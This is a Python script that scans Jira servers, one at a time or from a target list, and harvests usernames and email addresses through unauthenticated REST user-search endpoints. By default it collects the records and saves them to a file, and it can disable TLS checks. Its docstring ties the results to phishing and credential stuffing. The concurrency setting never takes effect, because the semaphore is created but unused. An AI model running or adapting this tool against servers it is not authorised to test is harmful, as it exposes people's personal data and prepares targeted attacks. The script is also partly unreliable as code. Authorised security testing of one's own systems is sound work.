#!/usr/bin/env python3
"""
Jira User Enumeration via Insecure API Endpoints
================================================
Scans for publicly accessible Jira servers that may be vulnerable to user enumeration
attacks due to improper API authentication mechanisms or misconfigurations.

Vulnerability details:
  - Certain Jira API endpoints expose sensitive user data, such as usernames
    and email addresses, without proper authentication.
  - Attackers can exploit these endpoints to enumerate user information,
    which can facilitate targeted phishing, credential stuffing, and privilege
    escalation attacks.
  - Typically affects misconfigured Jira instances or instances not implementing
    modern authentication controls.
   
Usage:
  # Scan a single target for user-enumeration vulnerabilities
  python jira_user_enum_scanner.py --target https://jira.example.com

  # Detection only (does not enumerate users)
  python jira_user_enum_scanner.py --target https://jira.example.com --safe

  # Scan multiple targets from a file
  python jira_user_enum_scanner.py --list targets.txt --output findings.json

  # Customize concurrency and disable TLS verification
  python jira_user_enum_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://jira.atlassian.com/
  - https://docs.atlassian.com/software/jira/docs/api/REST/
"""

import asyncio
import json
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ANSI color helpers
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME       = "jira_user_enum_scanner"
CVE_ID          = "MULTI"
CVSS            = "5.3-6.8"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Jira API detection endpoints
DETECTION_PATHS = [
    "/rest/api/latest/issue/createmeta",
    "/rest/api/2/serverInfo",
]

# User enumeration via Jira REST API endpoints
USER_ENUM_PATHS = [
    "/rest/api/latest/user/search?username=",
    "/rest/api/2/user/search?username=",
]

HEADER_JSON = {"Content-Type": "application/json"}

# ── Functions ────────────────────────────────────────────────────────────────

async def fetch(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Send an HTTP GET request and return the response if successful."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except httpx.RequestError as exc:
        print(f"{c(RED, '[!]')} Error: {exc}")
    except httpx.HTTPStatusError as exc:
        pass  # Ignore valid HTTP errors such as 403/404
    return None

async def detect_jira(client: httpx.AsyncClient, base_url: str) -> bool:
    """Detect Jira server by probing known paths."""
    for path in DETECTION_PATHS:
        url = f"{base_url.rstrip('/')}{path}"
        response = await fetch(client, url)
        if response and "Jira" in response.text:
            print(f"{c(GREEN, '[INFO]')} Detected Jira instance at {base_url}")
            return True
    print(f"{c(YELLOW, '[WARN]')} No Jira instance detected at {base_url}")
    return False
        
async def enumerate_users(client: httpx.AsyncClient, base_url: str, safe: bool) -> list:
    """
    Enumerate Jira users if applicable endpoints are exposed.
    Returns a list of identified usernames or emails, if vulnerable.
    """
    discovered_users = []
    if safe:
        print(f"{c(YELLOW, '[INFO]')} --safe mode enabled, skipping user enumeration for {base_url}")
        return discovered_users
    
    test_username_payload = "a"  # Jira `username` expects a single character for test
    for path in USER_ENUM_PATHS:
        url = f"{base_url.rstrip('/')}{path}{test_username_payload}"
        response = await fetch(client, url)
        if response and response.status_code == 200:
            try:
                user_results = response.json()
                if isinstance(user_results, list):
                    discovered_users.extend(user_results)
                    print(f"{c(RED, '[CRITICAL]')} User enumeration vulnerability found at {url}")
                    return discovered_users
            except json.JSONDecodeError:
                pass
    print(f"{c(GREEN, '[INFO]')} User enumeration not possible: {base_url}")
    return discovered_users

async def scan_target(client: httpx.AsyncClient, base_url: str, safe: bool) -> dict:
    """Scan a single target URL for Jira fingerprint and vulnerabilities."""
    result = {"url": base_url, "jira_detected": False, "user_enumeration_vulnerable": False, "users": []}
    
    # Detection
    if not await detect_jira(client, base_url):
        return result
    
    # Fingerprinting and vulnerability probing
    result["jira_detected"] = True
    users = await enumerate_users(client, base_url, safe)
    if users:
        result["user_enumeration_vulnerable"] = True
        result["users"] = users

    return result

async def run_scanner(args):
    """Main execution loop."""
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = []
        targets = []
        
        if args.target:
            targets.append(args.target)
        elif args.list:
            with open(args.list, "r") as f:
                targets.extend([line.strip() for line in f if line.strip()])
        
        for target in targets:
            tasks.append(scan_target(client, target, args.safe))
        
        results = await asyncio.gather(*tasks)
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
    
    for result in results:
        status_color = GREEN if not result["user_enumeration_vulnerable"] else RED
        print(f"{c(status_color, '[RESULT]')} {result['url']}")
        if result["jira_detected"]:
            print(f"   {c(YELLOW, 'Jira detected')}")
        if result["user_enumeration_vulnerable"]:
            print(f"   {c(RED, 'User enumeration vulnerable')}")
            print(f"   Discovered users: {result['users']}")

# ── Main CLI ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jira User Enumeration Scanner")
    parser.add_argument("--target", type=str, help="Target Jira URL to scan")
    parser.add_argument("--list", type=str, help="Path to input file containing target URLs")
    parser.add_argument("--output", type=str, help="Path to output JSON file for saving results")
    parser.add_argument("--safe", action="store_true", help="Detection only (safe mode)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests (default: 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification")
    
    args = parser.parse_args()
    
    if not args.target and not args.list:
        parser.error("Either --target or --list must be specified.")
    
    asyncio.run(run_scanner(args))
